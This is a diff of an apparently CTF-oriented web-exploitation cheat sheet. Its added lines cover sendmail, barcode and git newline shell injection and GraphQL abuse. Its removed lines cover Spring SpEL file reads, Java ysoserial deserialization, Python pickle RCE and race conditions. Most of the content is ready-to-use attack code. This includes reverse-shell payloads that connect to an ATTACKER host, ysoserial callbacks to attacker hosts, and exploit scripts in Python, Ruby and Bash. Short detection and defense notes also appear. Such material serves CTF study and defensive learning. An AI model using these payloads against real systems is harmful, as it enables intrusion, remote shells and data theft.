-  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
+mail=' -bp|ls SECRETS #
+mail=' -bp|cat SECRETS/backdoor123.php #
 ```
 
-**Key insight:** Distroless containers have no shell (`/bin/sh`), making `Runtime.exec()` useless even without WAF. Spring's `FileCopyUtils.copyToByteArray()` reads files without spawning processes. String concatenation (`"fl"+"ag.txt"`) bypasses static keyword matching in WAFs.
+The `-bp` flag forces sendmail into queue-print mode (non-interactive), and `|` pipes to shell. Discovery chain: find `.cgi_bak` backup files to read source → identify injection point → execute commands.
 
-**Alternative SpEL file read payloads:**
+### Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)
+
+When a service processes images containing barcodes (via zbar/zxing), multiple barcodes in one image get concatenated into a single string. Exploit by combining a valid barcode with a malicious Code128 barcode:
+
+1. **Create valid barcode:** Generate UPC/EAN-13 barcode that passes type validation
+2. **Create injection barcode:** Generate Code128 barcode containing shell metacharacters:
+   ```text
+   test", "node": "hi'; cat /flag > /tmp/out; #
+   ```
+3. **Combine into single image:** `montage valid.png malicious.png -tile 2x1 combined.png`
+4. **Upload:** Scanner reads both barcodes, concatenates values, and passes to a system() call or JSON parser
+
+```bash
+# Generate Code128 barcode with injection payload
+python3 -c "
+import barcode
+from barcode.writer import ImageWriter
+code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
+code.save('inject')
+"
+# Combine with valid UPC barcode
+montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
+```
+
+**Key insight:** Barcode libraries process ALL detected barcodes in an image. Type validation (e.g., "must be UPC") may only check the first barcode, while concatenated output from all barcodes flows into downstream processing. This is analogous to HTTP parameter pollution but for visual data.
+
+### Git CLI Newline Injection via URL Path (BSidesSF 2026)
+
+**Pattern (gitfab):** A web-based repository viewer shells out to git CLI using backticks: `` `git show "#{path}"` ``. The application sanitizes shell metacharacters (`<`, `>`, `|`, `;`, `&`) but allows newlines. URL-encoded newline (`%0a`) in the path parameter breaks out of the git command and injects arbitrary shell commands.
+
 ```text
-${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
-${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
+GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
 ```
 
-**Detection:** Spring Boot with `/api/admin/preview` or similar template rendering endpoint. Thymeleaf error messages in responses. `X-Api-Token` header pattern.
-
----
-
-## Java Deserialization (ysoserial)
-
-**Pattern:** Java apps using `ObjectInputStream.readObject()` on untrusted input. Serialized Java objects in cookies, POST bodies, or ViewState (base64-encoded, starts with `rO0AB` or hex `aced0005`).
-
-**Detection:**
-- Base64 decode suspicious blobs — Java serialized data starts with magic bytes `AC ED 00 05`
-- Search for `ObjectInputStream`, `readObject`, `readUnshared` in source
-- Content-Type `application/x-java-serialized-object`
-- Burp extension: Java Deserialization Scanner
-
-**Key insight:** Deserialization triggers code in `readObject()` methods of classes on the classpath. If a "gadget chain" exists (sequence of classes whose `readObject` → method calls lead to arbitrary execution), the attacker gets RCE without needing to upload code.
-
+Decoded, this becomes:
 ```bash
-# Generate payloads with ysoserial
-java -jar ysoserial.jar CommonsCollections1 'id' | base64
-java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser
-
-# Common gadget chains (try in order):
-# CommonsCollections1-7 (Apache Commons Collections)
-# CommonsBeanutils1 (Apache Commons BeanUtils)
-# URLDNS (no execution — DNS callback for blind detection)
-# JRMPClient (triggers JRMP connection)
-# Spring1/Spring2 (Spring Framework)
-
-# Blind detection via DNS callback (no RCE needed):
-java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64
-
-# Send payload
-curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
-  --data-binary @payload.ser
+git show "test"
+cat /home/ctf/flag.txt
+echo ""
 ```
 
-**Bypass filters:**
-- If `ObjectInputStream` subclass blocklists specific classes, try alternative chains
-- `ysoserial-modified` and `GadgetProbe` enumerate available gadget classes
-- JNDI injection (Java Naming and Directory Interface): `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI server
-- For Java 17+ (module system restrictions): look for application-specific gadgets or Jackson/Fastjson deserialization instead
+```ruby
+require 'httparty'
+
+# URL-encode newline injection
+path = 'test"%0acat /home/ctf/flag.txt%0aecho "'
+response = HTTParty.get("http://target/file/#{URI.encode_www_form_component(path)}")
+puts response.body
+```
+
+**Key insight:** Newline (`\n`, `%0a`) is frequently overlooked in command injection filters. While `;`, `|`, and `&` are commonly blocked, newline acts as a command separator in shell and is valid in URLs. Any application that passes URL path components to shell commands via string interpolation (backticks, `system()`, `popen()`) is vulnerable if newlines aren't filtered.
+
+**When to recognize:** Web app interacts with git, svn, or other CLI tools. Source shows shell interpolation with partial sanitization. Test with `%0a` (newline) and `%0d%0a` (CRLF) in URL parameters.
+
+**Defense check:** Does the filter block `\n` (0x0a)? Does it use allowlists instead of blocklists? Does it use `execve()` (no shell) instead of `system()` (shell)?
 
 ---
 
-## Python Pickle Deserialization
+## GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)
 
-**Pattern:** Python apps deserializing untrusted data with `pickle.loads()`, `pickle.load()`, or `shelve`. Common in Flask/Django session cookies, cached objects, ML model files (`.pkl`), Redis-stored objects.
+### Introspection and Schema Discovery
 
-**Detection:**
-- Base64 blobs containing `\x80\x04\x95` (pickle protocol 4) or `\x80\x05\x95` (protocol 5)
-- Source code: `pickle.loads()`, `pickle.load()`, `_pickle`, `shelve.open()`, `joblib.load()`, `torch.load()`
-- Flask sessions with `pickle` serializer (vs default `json`)
+```graphql
+# Full schema enumeration (often left enabled in CTFs)
+{__schema{types{name,fields{name,args{name,type{name}}}}}}
 
-**Key insight:** Python's `pickle.loads()` calls `__reduce__()` on deserialized objects, which can return `(os.system, ('command',))` — instant RCE. There is NO safe way to deserialize untrusted pickle data.
+# Shortened introspection query
+{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}
 
-```python
-import pickle, base64, os
+# Find all mutations
+{__schema{mutationType{fields{name,args{name,type{name}}}}}}
 
-class RCE:
-    def __reduce__(self):
-        return (os.system, ('cat /flag.txt',))
-
-payload = base64.b64encode(pickle.dumps(RCE())).decode()
-print(payload)
-
-# For reverse shell:
-class RevShell:
-    def __reduce__(self):
-        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
-
-# Using exec for multi-line payloads:
-class ExecRCE:
-    def __reduce__(self):
-        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
+# Find hidden types
+{__schema{types{name,kind,description}}}
 ```
 
-**Bypass restricted unpicklers:**
-- `RestrictedUnpickler` may allowlist specific modules — chain through allowed classes
-- If `builtins` allowed: `(__builtins__.__import__, ('os',))` then chain `.system()`
-- YAML deserialization (`yaml.load()` without `Loader=SafeLoader`) has similar RCE via `!!python/object/apply:os.system`
-- NumPy `.npy`/`.npz` files: `numpy.load(allow_pickle=True)` triggers pickle
+### Query Batching and Aliasing for Rate Limit Bypass
+
+```graphql
+# Execute same mutation N times in single request via aliases
+mutation {
+  a1: increaseVote(id: "target") { count }
+  a2: increaseVote(id: "target") { count }
+  a3: increaseVote(id: "target") { count }
+  # ... repeat 1337 times
+}
+
+# Or via array batching (if supported):
+# POST body: [{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}, ...]
+```
+
+### String Interpolation Injection
+
+```javascript
+// Vulnerable server code pattern:
+const query = `mutation { doAction(input: "${userInput}") { result } }`;
+
+// Injection payload:
+// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
+// Resulting query:
+// mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
+```
+
+**Key insight:** GraphQL combines query language power with REST-like endpoints. Three main attack surfaces: (1) introspection reveals the full API schema, (2) query batching/aliasing bypasses rate limits and multiplies actions, (3) string interpolation in server-side query construction enables injection similar to SQLi.
 
 ---
 
-## Race Conditions (TOCTOU)
-
-**Pattern:** Server checks a condition (balance, registration uniqueness, coupon validity) then performs an action in separate steps. Concurrent requests between check and action bypass the validation.
-
-**Key insight:** Send identical requests simultaneously. The server reads the "before" state for all of them, then applies all changes — each request sees the pre-modification state.
-
-```python
-import asyncio, aiohttp
-
-async def race(url, data, headers, n=20):
-    """Send n identical requests simultaneously"""
-    async with aiohttp.ClientSession() as session:
-        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
-        responses = await asyncio.gather(*tasks)
-        for r in responses:
-            print(r.status, await r.text())
-
-asyncio.run(race('http://target/api/transfer',
-    {'to': 'attacker', 'amount': 1000},
-    {'Cookie': 'session=...'},
-    n=50))
-```
-
-**Common CTF race condition targets:**
-- **Double-spend / balance bypass:** Transfer or purchase endpoint checked `if balance >= amount` → send 50 simultaneous transfers, all see original balance
-- **Coupon/code reuse:** Single-use codes validated then marked used → redeem simultaneously before mark
-- **Registration uniqueness:** `if not user_exists(name)` → register same username concurrently, one overwrites the other (admin account takeover)
-- **File upload + use:** Upload file, server validates then moves → access file between upload and validation (or between validation and deletion)
-
-```bash
-# Turbo Intruder (Burp) — most reliable for precise timing
-# Or use curl with GNU parallel:
-seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
-  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
-```
-
-**Detection in source code:**
-- Non-atomic read-then-write patterns without locks/transactions
-- `SELECT ... UPDATE` without `FOR UPDATE` or serializable isolation
-- File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
-- Redis `GET` then `SET` without `WATCH`/`MULTI`
+*See also: [server-side-exec.md](server-side-exec.md) for code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), and [server-side-exec-2.md](server-side-exec-2.md) for SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, PNG/PHP polyglot upload, and more.*
